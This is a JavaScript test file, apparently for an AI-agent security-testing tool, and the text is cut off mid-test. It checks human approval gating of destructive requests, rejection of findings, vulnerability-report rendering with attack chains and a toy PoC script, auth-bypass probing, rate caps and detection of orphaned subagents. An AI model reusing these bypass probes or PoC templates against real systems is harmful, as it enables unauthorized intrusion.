  const first = await h.run("src_http", { url: "http://127.0.0.1:59999/api-c/user/v1/closeAccount", method: "POST", headers: { authorization: "Bearer t", userId: "3" }, body: '{"x":1}', justification: "删改" }, parent);
  const second = await h.run("src_http", { url: "http://127.0.0.1:59999/api-c/user/v1/closeAccount", method: "POST", headers: { authorization: "Bearer t", userId: "3" }, body: '{"x":1}', justification: "重发同请求" }, parent);
  assert.equal(first.approval, "pending");
  assert.equal(second.approval, "pending");
  assert.equal(second.pendingApprovalId, first.pendingApprovalId, "去重复用同一 pending id，不新增队列项");
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.counts.pendingApprovals, 1, "去重后表里只有一条 pending");
});
test("[local.31] src_http 挂起发 src_record_pending_approval 合成事件→投影出现待审节点", async () => {
  const h = harness();
  const parent = h.exec("ap-fold");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "fold 验证" }, parent);
  const r = await h.run("src_http", { url: "http://127.0.0.1:59998/api-c/user/v1/closeAccount", method: "GET", headers: { userId: "7", authorization: "Bearer t" }, justification: "删改" }, parent);
  const events = h.sessions.get("ap-fold").events;
  const synth = events.find((e) => e.type === "tool/call" && e.data?.name === "src_record_pending_approval");
  assert.ok(synth !== void 0, "发了 src_record_pending_approval 合成事件");
  assert.equal(JSON.parse(synth.data.arguments).id, r.pendingApprovalId);
});
test("[local.31] src_resolve_approval 幂等：已 approved/rejected 不可重复审批", async () => {
  const server = http.createServer((_req, res) => { res.writeHead(204); res.end(); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const h = harness();
  const parent = h.exec("ap-idem");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "幂等验证" }, parent);
  try {
    const hung = await h.run("src_http", { url: `http://127.0.0.1:${port}/api-c/user/v1/closeAccount`, method: "POST", headers: { authorization: "Bearer t", userId: "2" }, body: '{"a":1}', justification: "删改" }, parent);
    await h.run("src_resolve_approval", { id: hung.pendingApprovalId, action: "allow" }, parent);
    /* 重复审批应报错。 */
    await assert.rejects(() => h.run("src_resolve_approval", { id: hung.pendingApprovalId, action: "reject" }, parent), /已 approved/);
  } finally { server.close(); }
});

/* [local.26] 模块二：打回闭环——src_reject_finding + 闸防二次提交。 */
test("[local.26] src_reject_finding 置 status=rejected + 备注；相似 title 二次提交被闸拒绝", async () => {
  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("rej1");
  await h.run("src_add_goal", { target: "example.test", objective: "打回闭环测试" }, parent);
  const st = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "删越权", detail: "d", goalId: st.goal.id }, parent);
  const fe = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "证据记录响应体含敏感信息", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId: intent.id, title: "账号删除漏洞", severity: "high", impact: "攻击者可删任意账号造成用户无法登录与服务中断", victimImpact: "用户被删账号无法登录且无法察觉删除来源", attackPrerequisites: "需登录态且可指定 userId 遍历枚举", concreteLossEvidence: [fe], affectedScope: "全量用户", remediation: "鉴权校验归属", pocEvidence: ["e"], reproducibleSteps: ["step1"] }, parent);
  /* 打回 */
  const rej = await h.run("src_reject_finding", { findingId: "finding-1", reason: "没看懂，能梳理下攻击链吗？" }, parent);
  assert.equal(rej.status, "rejected");
  assert.equal(rej.rejectReason, "没看懂，能梳理下攻击链吗？");
  const st2 = await h.run("src_state", {}, parent);
  assert.equal(st2.findings[0].status, "rejected");
  /* 相似 title 二次提交被闸拒绝 */
  await assert.rejects(() => h.run("src_add_finding", { intentId: intent.id, title: "账号删除漏洞", severity: "high", impact: "攻击者可删任意账号造成用户无法登录", victimImpact: "用户被删账号无法登录且无法察觉", attackPrerequisites: "需登录态且可指定 userId 遍历", concreteLossEvidence: [fe], affectedScope: "全量用户", remediation: "鉴权", pocEvidence: ["e"], reproducibleSteps: ["s"] }, parent), /已打回/);
  /* 报告含「已打回」节 + 打回备注 */
  const report = await h.run("src_report", {}, parent);
  assert.ok(report.markdown.includes("## 已打回"), "报告含已打回节");
  assert.ok(report.markdown.includes("没看懂，能梳理下攻击链吗？"), "报告含打回备注");
  /* [local.27] 回归：打回后主漏洞清单不再含该 finding 的标题行（用户 bug：报告里还有） */
  const findingsSection = report.markdown.split("## 漏洞发现")[1].split("## ")[0];
  assert.ok(!findingsSection.includes("### finding-1"), "打回后主漏洞清单不含已打回 finding");
  assert.ok(!findingsSection.includes("**漏洞名称**：账号删除漏洞"), "主漏洞清单不含已打回 finding 标题");
  assert.ok(findingsSection.includes("（无）"), "全部打回后主漏洞清单为空态");
});
test("[local.26] src_update_finding 补 attackChain；报告渲染攻击链叙事节", async () => {
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("chain1");
  await h.run("src_add_goal", { target: "example.test", objective: "攻击链测试" }, parent);
  const st = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "i1", detail: "d", goalId: st.goal.id }, parent);
  const fe = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "证据", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId: intent.id, title: "多跳越权", severity: "high", impact: "可改任意用户订单造成数据篡改", victimImpact: "用户订单被篡改且难以察觉", attackPrerequisites: "需登录态可遍历订单 id", concreteLossEvidence: [fe], affectedScope: "s", remediation: "r", pocEvidence: ["e"], reproducibleSteps: ["s1"], attackChain: "发现 /api/admin → 骗登录 → 改数据 → 用户损失 → 全量用户受影响", vulnType: "越权漏洞" }, parent);
  const report = await h.run("src_report", {}, parent);
  assert.ok(report.markdown.includes("**漏洞类型**：越权漏洞"), "vulnType 渲染");
  assert.ok(report.markdown.includes("发现 /api/admin → 骗登录"), "attackChain 叙事融入 section1");
  /* 无 attackChain 时由字段填充 */
  await h.run("src_add_finding", { intentId: intent.id, title: "单步漏洞", severity: "medium", impact: "可读取他人订单信息造成泄露", victimImpact: "用户订单信息泄露给攻击者", attackPrerequisites: "需登录态可枚举订单 id 遍历", concreteLossEvidence: [fe], affectedScope: "s", remediation: "r", pocEvidence: ["e"], reproducibleSteps: ["s"] }, parent);
  const report2 = await h.run("src_report", {}, parent);
  assert.ok(report2.markdown.includes("③ 利用过程：可读取他人订单信息造成泄露"), "无 attackChain 时③利用过程渲染");
  assert.ok(report2.markdown.includes("**漏洞类型**：未分类"), "无 vulnType 时走未分类占位");
});
test("[local.27] pocScript 以代码块渲染保留缩进；rawRequest 代码块保留缩进", async () => {
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("script1");
  await h.run("src_add_goal", { target: "example.test", objective: "脚本渲染测试" }, parent);
  const st = await h.run("src_state", {}, parent);
  const intent = await h.run("src_add_intent", { title: "i1", detail: "d", goalId: st.goal.id }, parent);
  const fe = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "证据", confidence: 0.9 }, parent)).id;
  const script = "import requests\n\ndef attack(phone):\n    r = requests.get(f\"/api?p={phone}\")\n    if r.ok:\n        print(r.json())";
  await h.run("src_add_finding", { intentId: intent.id, title: "验证码枚举", severity: "high", impact: "可枚举验证码接管账号", victimImpact: "用户账号被接管且完全无感知，手机号与个人信息泄露，账号可被冒用充值或消费", attackPrerequisites: "攻击者仅需知道目标手机号，无需用户任何交互", concreteLossEvidence: [fe], affectedScope: "全量", remediation: "限频", pocEvidence: ["e"], reproducibleSteps: ["s1"], vulnType: "登录认证漏洞", pocScript: script, rawRequest: "GET /api/login?code=0001 HTTP/1.1\nHost: x.com\n    Authorization: Bearer t" }, parent);
  const report = await h.run("src_report", {}, parent);
  /* 一键脚本独立代码块 */
  assert.ok(report.markdown.includes("一键利用脚本："), "报告含一键脚本标题");
  assert.ok(report.markdown.includes("```\n" + script + "\n```"), "pocScript 以代码块渲染");
  assert.ok(report.markdown.includes("    r = requests.get"), "脚本缩进保留");
  /* rawRequest 代码块保留缩进 */
  assert.ok(report.markdown.includes("```\nGET /api/login"), "rawRequest 以代码块渲染");
  assert.ok(report.markdown.includes("    Authorization: Bearer t"), "rawRequest 缩进保留");
});

test("[local.30] 垂直攻击链①到⑤ + app 资产应用下载行 + 前端功能点（纯 mock）", async () => {
  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("chain1");
  await h.run("src_add_goal", { target: "example.test", objective: "app 漏洞报告渲染测试" }, parent);
  const st = await h.run("src_state", {}, parent);
  /* 构造一个 app 资产，meta 里记下载方式 */
  const asset = await h.run("src_add_asset", { type: "app", value: "com.example.app", meta: "下载：https://app.example.test/download/v2.3.1 apk", source: "应用商店" }, parent);
  const intent = await h.run("src_add_intent", { title: "i1", detail: "d", goalId: st.goal.id }, parent);
  const fe = (await h.run("src_add_fact", { intentId: intent.id, kind: "http", detail: "越权读取证据", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId: intent.id, title: "越权读取他人相册", severity: "high", impact: "遍历 userId 读取任意用户相册造成隐私泄露", victimImpact: "用户私密照片被陌生人查看与下载，隐私严重泄露且无感知", attackPrerequisites: "需登录（登录入口 https://app.example.test/login），普通账号即可遍历 userId", concreteLossEvidence: [fe], affectedScope: "全量用户", remediation: "后端校验 userId 归属", pocEvidence: ["GET /api/album?userId=2 -> 200"], reproducibleSteps: ["登录后 GET /api/album?userId=2"], vulnType: "越权漏洞", affectedAssetId: asset.id, discoveryPath: "抓包发现 /api/album 接口", entryPoint: "个人中心-相册页" }, parent);
  const report = await h.run("src_report", {}, parent);
  /* 垂直攻击链①到⑤ */
  assert.ok(report.markdown.includes("【攻击链】"), "攻击链标题");
  assert.ok(report.markdown.includes("① 发现：抓包发现 /api/album 接口"), "① 发现");
  assert.ok(report.markdown.includes("② 利用前提：需登录（登录入口 https://app.example.test/login）"), "② 利用前提含登录入口");
  assert.ok(report.markdown.includes("③ 利用过程：遍历 userId"), "③ 利用过程");
  assert.ok(report.markdown.includes("④ 实际损失："), "④ 实际损失");
  assert.ok(report.markdown.includes("⑤ 受害者影响：用户私密照片"), "⑤ 受害者影响");
  /* app 资产应用下载行（从 meta 提取 URL） */
  assert.ok(report.markdown.includes("应用下载：https://app.example.test/download/v2.3.1"), "app 资产应用下载行");
  /* 前端功能点 */
  assert.ok(report.markdown.includes("前端功能点：个人中心-相册页"), "前端功能点行");
  /* 各步骤从上到下顺序：① 在 ② 之前 */
  assert.ok(report.markdown.indexOf("① 发现") < report.markdown.indexOf("② 利用前提"), "① 在②之前");
  assert.ok(report.markdown.indexOf("② 利用前提") < report.markdown.indexOf("③ 利用过程"), "② 在③之前");
});

/* [local.32] 报告节完整性闸：UI reportOf（ReportView.tsx）的节标题集合必须与服务端 buildReport 逐字一致。
   双渲染漂移第三次显灵——把「每波手工同步」变成测试闸：任何一侧增/改/删节而另一侧没跟，这里红。 */
test("[local.32] 报告节完整性：UI reportOf 与服务端 buildReport 节标题集合一致（双渲染漂移闸）", async () => {
  const h = harness();
  const parent = h.exec("sec-gate");
  await h.run("src_add_goal", { target: "https://example.test", objective: "节完整性闸", authorization: "SRC" }, parent);
  const report = await h.run("src_report", {}, parent);
  const serverTitles = [...report.markdown.matchAll(/^## (.+)$/gm)].map((m) => m[1]).sort();
  assert.ok(serverTitles.length > 0, "服务端报告应包含 ## 节");
  const root = nodePath.resolve(nodePath.dirname(new URL(import.meta.url).pathname), "..");
  const tsx = await fsPromises.readFile(nodePath.join(root, "src/dsh-client-ui-src/src/client/ReportView.tsx"), "utf8");
  const usedKeys = [...new Set([...tsx.matchAll(/\bt\('(report\.sec\.[A-Za-z]+)'\)/g)].map((m) => m[1]))];
  assert.ok(usedKeys.length > 0, "ReportView.tsx 应使用 report.sec.* 节标题词条");
  const locales = await fsPromises.readFile(nodePath.join(root, "src/dsh-client-ui-src/src/client/locales.ts"), "utf8");
  const zhMap = {};
  /* zh 字典在文件前半，首个出现优先。 */
  for (const m of locales.matchAll(/'(report\.sec\.[A-Za-z]+)':\s*'([^']+)'/g)) if (zhMap[m[1]] === void 0) zhMap[m[1]] = m[2];
  const uiTitles = usedKeys.map((key) => zhMap[key]).sort();
  assert.deepEqual(uiTitles, serverTitles);
});

/* [local.32] src_http 软速率帽：同会话连续两次放行请求发送间隔 ≥250ms（≈≤4rps），且都成功（延迟而非拒绝）。 */
test("[local.32] src_http 软速率帽：连续放行请求发送间隔 ≥250ms 且不拒绝", async () => {
  const sendAt = [];
  const server = http.createServer((req, res) => { sendAt.push(Date.now()); res.writeHead(200, { "content-type": "text/plain" }); res.end("ok"); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const h = harness();
  const parent = h.exec("throttle");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "速率帽验证" }, parent);
  try {
    const first = await h.run("src_http", { url: `http://127.0.0.1:${port}/api/v1/users/list`, method: "GET", justification: "读名单无破坏性" }, parent);
    const t0 = Date.now();
    const second = await h.run("src_http", { url: `http://127.0.0.1:${port}/api/v1/orders/detail`, method: "GET", justification: "读详情无破坏性" }, parent);
    const elapsed = Date.now() - t0;
    assert.equal(first.approval, "allowed-auto");
    assert.equal(second.approval, "allowed-auto");
    assert.equal(first.status, 200);
    assert.equal(second.status, 200, "软限制不拒绝");
    assert.equal(sendAt.length, 2, "两次都真实发出");
    assert.ok(elapsed >= 225, `第二次调用应等待速率帽（实际 ${elapsed}ms）`);
    assert.ok(sendAt[1] - sendAt[0] >= 235, `两次发送间隔应 ≥250ms 左右（实际 ${sendAt[1] - sendAt[0]}ms）`);
  } finally { server.close(); }
});

/* [local.32] 基础设施默认沿用上次会话：新会话零覆盖项时 src_add_goal 自动复制最近配置过的其他会话设置；
   本会话显式保存过任何设置则完全尊重，不自动沿用。 */
test("[local.32] src_add_goal 默认沿用上次会话基础设施（显式设置不被覆盖）", async () => {
  const h = harness();
  const a = h.exec("sess-a");
  await h.run("src_add_goal", { target: "https://a.test", objective: "先配置基础设施" }, a);
  await h.run("src_set_infra", { key: "proxyUrl", value: "http://127.0.0.1:7890" }, a);
  await h.run("src_set_infra", { key: "burpMcpPort", value: "9876" }, a);
  /* 新会话 b：零覆盖项 → 建目标自动沿用。 */
  const b = h.exec("sess-b");
  const goalB = await h.run("src_add_goal", { target: "https://b.test", objective: "新会话免重填" }, b);
  assert.ok(goalB.infraInherited, "应返回 infraInherited");
  assert.match(goalB.infraInherited.summary, /proxyUrl=http:\/\/127\.0\.0\.1:7890/);
  assert.match(goalB.infraInherited.summary, /burpMcpPort=9876/);
  const infraB = await h.run("src_get_infra", {}, b);
  assert.equal(infraB.infra.proxyUrl, "http://127.0.0.1:7890");
  assert.equal(infraB.infra.burpMcpPort, "9876");
  /* 投影同步：每个沿用项都有合成 src_set_infra 事件。 */
  const events = h.sessions.get("sess-b").events.filter((e) => e.type === "tool/call" && e.data.name === "src_set_infra");
  assert.equal(events.length, 2, "沿用项应有合成事件同步投影");
  /* 会话 c：显式设置过自己的 proxyUrl → 完全不自动沿用。 */
  const c = h.exec("sess-c");
  await h.run("src_set_infra", { key: "proxyUrl", value: "http://127.0.0.1:9999" }, c);
  const goalC = await h.run("src_add_goal", { target: "https://c.test", objective: "已有显式设置" }, c);
  assert.equal(goalC.infraInherited, void 0, "显式设置过的会话不自动沿用");
  const infraC = await h.run("src_get_infra", {}, c);
  assert.equal(infraC.infra.proxyUrl, "http://127.0.0.1:9999");
});

/* [local.32] 401 语义修正：预检/扫描遇 401 是认证边界发现信号——不触发 requiresDecision、不停扫、不置 protectionSignal。 */
test("[local.32] scan_surface 遇 401 不算风控：继续扫完且 protectionSignal 不置真", async () => {
  const h = harness();
  const parent = h.exec("p401");
  await h.run("src_add_goal", { target: "https://example.test", objective: "认证边界扫描", authorization: "SRC" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response('{"error":"unauthorized"}', { status: 401, headers: { "content-type": "application/json" } });
    const result = await h.run("src_scan_surface", { baseUrl: "https://example.test", paths: ["/admin", "/api/users/list"], rps: 10 }, parent);
    assert.equal(result.requiresDecision, false, "401 预检不应触发 requiresDecision");
    assert.equal(result.stopped, void 0, "401 不应触发停扫");
    assert.equal(result.requested, 2, "全部路径都应扫到");
    for (const row of result.results) assert.equal(row.protectionSignal, false, "401 不应置 protectionSignal");
  } finally { globalThis.fetch = originalFetch; }
});

/* [local.33] 认证预算投影通道：src_test_bypass 发出认证请求后应发 src_auth_budget 合成事件（UI 头部「认证 used/limit」格数据源）。 */
test("[local.33] src_test_bypass 认证请求后发 src_auth_budget 合成事件", async () => {
  const h = harness();
  const parent = h.exec("g33bud");
  await h.run("src_add_goal", { target: "https://example.test", objective: "预算投影", authorization: "t" }, parent);
  const intent = await h.run("src_add_intent", { title: "auth", goalId: "goal-1" }, parent);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "authorization-bypass", hypothesis: "auth bypass", status: "hypothesis" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    globalThis.fetch = async () => new Response("ok", { status: 200, headers: { "content-type": "application/json" } });
    const result = await h.run("src_test_bypass", {
      intentId: intent.id, researchId: research.id, category: "authorization-bypass", baseUrl: "https://example.test",
      baseline: { method: "GET", path: "/api/me", headers: { cookie: "sid=abc" } },
      variants: [{ method: "GET", path: "/api/admin", headers: { cookie: "sid=abc" } }]
    }, parent);
    assert.equal(result.requiresDecision, false);
    assert.equal(result.authBudgetExhausted, void 0, "2 次认证请求不应触顶");
    /* 合成事件携带权威计数（fold → 投影 → UI）。 */
    const events = h.sessions.get("g33bud").events.filter((e) => e.type === "tool/call" && e.data.name === "src_auth_budget");
    assert.equal(events.length, 1, "应恰好一条 src_auth_budget 事件");
    const payload = JSON.parse(events[0].data.arguments);
    assert.equal(payload.used, 2, "baseline + variant 各计一次");
    assert.equal(payload.limit, 30);
    /* 未发认证请求的调用不应发事件。 */
    await h.run("src_test_bypass", {
      intentId: intent.id, researchId: research.id, category: "method-bypass", baseUrl: "https://example.test",
      baseline: { method: "GET", path: "/api/me" }, variants: [{ method: "POST", path: "/api/me" }]
    }, parent);
    const eventsAfter = h.sessions.get("g33bud").events.filter((e) => e.type === "tool/call" && e.data.name === "src_auth_budget");
    assert.equal(eventsAfter.length, 1, "无认证请求不发事件");
  } finally { globalThis.fetch = originalFetch; }
});

/* [local.33] 域笔记快照投影通道：src_add_goal 开局推送 + src_record_domain_note 落库刷新 + 跨会话可见。 */
test("[local.33] src_add_goal / src_record_domain_note 推送域笔记快照事件（跨会话可见）", async () => {
  const h = harness();
  const a = h.exec("g33note-a");
  await h.run("src_add_goal", { target: "https://note.test", objective: "首轮", authorization: "t" }, a);
  let snaps = h.sessions.get("g33note-a").events.filter((e) => e.type === "tool/call" && e.data.name === "src_domain_notes_snapshot");
  assert.equal(snaps.length, 1, "开局应有一条快照");
  assert.deepEqual(JSON.parse(snaps[0].data.arguments).notes, [], "新目标开局快照为空");
  await h.run("src_record_domain_note", { category: "pitfall", title: "api/v1 限流", content: "burst 会 429" }, a);
  snaps = h.sessions.get("g33note-a").events.filter((e) => e.type === "tool/call" && e.data.name === "src_domain_notes_snapshot");
  assert.equal(snaps.length, 2, "落库后刷新快照");
  const notesA = JSON.parse(snaps[1].data.arguments).notes;
  assert.equal(notesA.length, 1);
  assert.equal(notesA[0].title, "api/v1 限流");
  assert.equal(notesA[0].content, "burst 会 429", "快照含 content 全文");
  assert.equal(notesA[0].category, "pitfall");
  /* 新会话同目标续测：开局快照带出历史域笔记（跨会话）。 */
  const b = h.exec("g33note-b");
  await h.run("src_add_goal", { target: "https://note.test", objective: "续测", authorization: "t" }, b);
  const snapsB = h.sessions.get("g33note-b").events.filter((e) => e.type === "tool/call" && e.data.name === "src_domain_notes_snapshot");
  assert.equal(snapsB.length, 1);
  const notesB = JSON.parse(snapsB[0].data.arguments).notes;
  assert.equal(notesB.length, 1, "历史域笔记应被带出");
  assert.equal(notesB[0].id, notesA[0].id, "同一条笔记（store 权威 id）");
  /* 快照事件可直接被 fold 消费成投影（UI 渲染数据面）。 */
  const { applySrcEvent, srcInitialState, viewSrcState } = await import("../lib/src.js");
  let st = JSON.parse(JSON.stringify(srcInitialState));
  st = applySrcEvent(st, { type: "tool/call", data: { name: "src_add_goal", arguments: JSON.stringify({ target: "note.test", objective: "续测" }) } });
  st = applySrcEvent(st, { type: "tool/call", data: { name: "src_domain_notes_snapshot", arguments: JSON.stringify({ notes: notesB }) } });
  const view = viewSrcState(st);
  assert.equal(view.domainNotes.length, 1);
  assert.equal(view.domainNotes[0].content, "burst 会 429");
});

/* [local.34] 工具输出 schema 一致性闸：零参视图工具的实际输出键必须 ⊆ output schema 声明属性。
   dsh 核心运行时按 additionalProperties:false 校验工具输出，undeclared 键直接报错——local.31 给
   store.view 加了 pendingApprovals 却没在 src_state output schema 声明，导致真实运行时每次
   src_state 都炸；测试 harness 直连 execute 不过 schema 校验所以全绿漏网。此闸防再犯。 */
test("[local.34] 工具输出 schema 一致性闸：零参工具输出键 ⊆ 声明属性（fresh + 含待审/笔记/待办的会话）", async () => {
  const h = harness();
  const fresh = h.exec("g34fresh");
  const full = h.exec("g34full");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "schema 闸", authorization: "本地自测" }, full);
  await h.run("src_add_intent", { title: "侦察", goalId: "goal-1" }, full);
  await h.run("src_user_todo", { title: "提供登录态", detail: "需要 cookie", kind: "auth-session" }, full);
  await h.run("src_record_domain_note", { category: "pitfall", title: "api/v1 限流", content: "burst 会 429" }, full);
  /* 高危请求 → 异步挂起（不发网络），store pending_approvals 表有行——复现用户实测报错的数据形态。 */
  let hitCount = 0;
  const server = http.createServer((req, res) => { hitCount++; res.writeHead(204); res.end(); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  try {
    const pending = await h.run("src_http", { url: `http://127.0.0.1:${server.address().port}/api/v1/user/7/settings`, method: "POST", headers: { authorization: "Bearer t" }, body: '{"userId":7}', justification: "schema 闸待审样本" }, full);
    assert.equal(pending.approval, "pending", "高危请求应挂起");
    assert.equal(hitCount, 0, "挂起不发网络");
  } finally { server.close(); }
  const conform = (name, out) => {
    const schema = h.tools.get(name)?.output?.schema;
    assert.ok(schema, `${name} 应有 output schema`);
    if (schema.additionalProperties === false && schema.properties !== void 0) {
      const declared = new Set(Object.keys(schema.properties));
      for (const key of Object.keys(out)) assert.ok(declared.has(key), `${name} 输出键「${key}」未在 output schema 声明（运行时 additionalProperties:false 会炸）`);
    }
    for (const [key, prop] of Object.entries(schema.properties ?? {})) {
      if (prop && prop.required === true) assert.ok(key in out, `${name} 缺 required 键「${key}」`);
    }
  };
  for (const sess of [fresh, full]) {
    for (const name of ["src_state", "src_graph", "src_report", "src_get_infra", "src_list_domain_notes"]) {
      let out;
      try { out = await h.run(name, {}, sess); } catch { continue; }
      if (out === void 0 || out === null) continue;
      conform(name, out);
    }
  }
  const st = await h.run("src_state", {}, full);
  assert.ok(Array.isArray(st.pendingApprovals) && st.pendingApprovals.length >= 1, "src_state 应输出 pendingApprovals（回归点）");
  assert.equal(st.pendingApprovals[0].status, "pending");
});

/* [local.35] 域笔记沉淀闸（软警告）：本会话踩过防护/限流信号或已否假设但零域笔记新增 → finalize 警告；记过则无。
   401 是认证边界发现信号（local.32 语义），不算沉淀信号。 */
test("[local.35] finalize 域笔记沉淀闸：有目标特有信号零笔记 → 警告；记过/无信号 → 无警告", async () => {
  const h = harness();
  const parent = h.exec("g35note");
  await h.run("src_add_goal", { target: "https://example.test", objective: "域笔记闸", authorization: "t" }, parent);
  const intent = await h.run("src_add_intent", { title: "侦察", goalId: "goal-1" }, parent);
  const BLIND = [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }];
  /* 场景①：本会话有 protectionSignal observation + false-positive research，零域笔记 → 警告 */
  await h.run("src_record_observation", { intentId: intent.id, method: "GET", path: "/admin", httpStatus: 403, protectionSignal: true, source: "scan", decision: "WAF 拦截" }, parent);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "waf-bypass", hypothesis: "分块绕过", status: "false-positive", stopReason: "分块不被支持" }, parent);
  assert.equal(research.updated, false);
  const warned = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: BLIND, allowIncomplete: true, allowIncompleteReason: "测试停止" }, parent);
  const warnText = warned.warnings.join(" ");
  assert.match(warnText, /未沉淀任何域笔记/, "有信号零笔记应警告");
  assert.match(warnText, /1 个防护\/限流信号、1 条已否\/受阻假设/);
  /* 场景②：同会话记一条域笔记后警告消失 */
  await h.run("src_record_domain_note", { category: "pitfall", title: "admin 全域 WAF", content: "403 challenge 页" }, parent);
  const clean = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: BLIND, allowIncomplete: true, allowIncompleteReason: "测试停止" }, parent);
  assert.doesNotMatch(clean.warnings.join(" "), /未沉淀任何域笔记/, "记过笔记后不应再警告");
  /* 场景③：401 observation 是认证边界信号不算沉淀信号（无信号+零笔记 → 无域笔记警告） */
  const h2 = harness();
  const p2 = h2.exec("g35auth401");
  await h2.run("src_add_goal", { target: "https://auth.example.test", objective: "401 语义", authorization: "t" }, p2);
  const it2 = await h2.run("src_add_intent", { title: "认证面", goalId: "goal-1" }, p2);
  await h2.run("src_record_observation", { intentId: it2.id, method: "GET", path: "/api/me", httpStatus: 401, protectionSignal: false, source: "scan", decision: "认证边界" }, p2);
  const fin2 = await h2.run("src_finalize_engagement", { remainingDirections: [], blindSpots: BLIND, allowIncomplete: true, allowIncompleteReason: "测试停止" }, p2);
  assert.doesNotMatch(fin2.warnings.join(" "), /未沉淀任何域笔记/, "仅 401 不触发域笔记警告（认证语义保留）");
  /* 场景④：别的会话在同一目标记过笔记、本会话零新增 → 仍警告（sourceSessionId 区分） */
  const other = h.exec("g35other");
  await h.run("src_add_goal", { target: "https://example.test", objective: "别会话记的", authorization: "t" }, other);
  await h.run("src_record_domain_note", { category: "fingerprint", title: "别会话的笔记", content: "不应抵消本会话义务" }, other);
  const fin3 = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: BLIND, allowIncomplete: true, allowIncompleteReason: "测试停止" }, parent);
  assert.match(fin3.warnings.join(" "), /未沉淀任何域笔记/, "其他会话的笔记不能抵消本会话的沉淀义务");
});

/* [local.40] 孤儿 running intent 巡检：web 重启/子代理死亡后父代理对着 running 干等是已知卡死模式。
   三个场景：①无 checkpoint 的 running intent ②最新 checkpoint 停在 progress 且距今≥30分钟 ③正常 completed/新 checkpoint 不误报。
   checkpoint 的 createdAt 由 src_submit 用 Date.now() 硬编码（不可注入），测试用冻结时钟模拟"31 分钟前提交"。 */
function freezeClock(at) {
  const real = Date.now;
  Date.now = () => at;
  return () => { Date.now = real; };
}

test("src_state flags orphan running intents (no checkpoint / stale progress) with actionable hints", async () => {
  const h = harness();
  const parent = h.exec("parent");
  const childA = h.exec("childA", "parent");
  const childB = h.exec("childB", "parent");
  const childC = h.exec("childC", "parent");

  const goal = await h.run("src_add_goal", { target: "https://example.test", objective: "orphan detection check", authorization: "ticket-42" }, parent);
  const intentA = await h.run("src_add_intent", { title: "Never reported", detail: "child died before first checkpoint", goalId: goal.id }, parent);
  const intentB = await h.run("src_add_intent", { title: "Stale progress", detail: "child went silent mid-work", goalId: goal.id }, parent);
  const intentC = await h.run("src_add_intent", { title: "Healthy", detail: "finished cleanly", goalId: goal.id }, parent);

  /* 模拟委派后 running：A 直接 running（从未汇报）；B 走 submit 自动置 running */
  await h.run("src_update_intent", { intentId: intentA.id, status: "running" }, parent);

  const baseBatch = (intentId) => ({
    intentId,
    facts: [{ kind: "http", target: "https://example.test", detail: `probe ${intentId}`, confidence: "90%" }],
    assets: [], findings: []
  });

  /* intentB：31 分钟前 progress，无收尾 → 孤儿 */
  const stale = Date.now() - 31 * 60 * 1000;
  const unfreeze = freezeClock(stale);
  try {
    await h.run("src_submit", { ...baseBatch(intentB.id), stage: "progress", summary: "mid-work evidence" }, childB);
  } finally { unfreeze(); }
  /* intentC：刚提交 completed → 不算孤儿 */
  await h.run("src_submit", { ...baseBatch(intentC.id), stage: "completed", summary: "done", decision: "no issue" }, childC);

  const state = await h.run("src_state", {}, parent);
  const orphans = state.orphanIntents ?? [];
  assert.equal(orphans.length, 2, `expected exactly intentA+intentB orphaned, got ${JSON.stringify(orphans.map((o) => o.intentId))}`);

  const orphanA = orphans.find((o) => o.intentId === intentA.id);
  assert.ok(orphanA, "intentA (no checkpoint) must be flagged");
  assert.match(orphanA.hint, /无任何 checkpoint/);
  assert.ok(orphanA.childSessionId === undefined);

  const orphanB = orphans.find((o) => o.intentId === intentB.id);
  assert.ok(orphanB, "intentB (stale progress) must be flagged");
  assert.equal(orphanB.childSessionId !== undefined, true, "orphanB must expose childSessionId for src_recover_child");
  assert.ok(orphanB.idleMinutes >= 30, `idleMinutes should be >=30, got ${orphanB.idleMinutes}`);
  assert.match(orphanB.hint, /src_recover_child/);
  assert.ok(!orphans.some((o) => o.intentId === intentC.id), "completed intent must never be flagged");
});

test("src_state does not flag fresh progress checkpoints as orphans", async () => {
  const h = harness();
  const parent = h.exec("parent");
  const child = h.exec("child", "parent");
  const goal = await h.run("src_add_goal", { target: "https://example.test", objective: "fresh progress check", authorization: "ticket-42" }, parent);
